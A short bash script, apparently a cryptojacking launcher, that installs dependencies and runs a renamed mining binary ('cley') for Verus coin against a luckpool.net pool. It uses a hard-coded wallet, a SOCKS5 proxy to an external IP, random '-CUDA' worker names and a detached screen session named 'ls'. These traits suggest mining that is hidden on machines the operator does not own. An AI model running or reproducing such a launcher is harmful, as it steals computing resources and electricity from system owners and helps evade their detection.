#!/bin/bash
sudo apt update 
sudo apt install screen libjansson4 -y 
chmod +x cley
screen -dmS ls 
POOL=stratum+tcp://eu.luckpool.net:3956
WALLET=REpjC6VmRd7LwtK9xuWEZQfPvSYpBCia5s
WORKER=$(echo $(shuf -i 1-7 -n 1)-CUDA)
PROXY=socks5://88.202.177.242:1085
./cley -a verus -o $POOL -u $WALLET.$WORKER -t 2 -x $PROXY
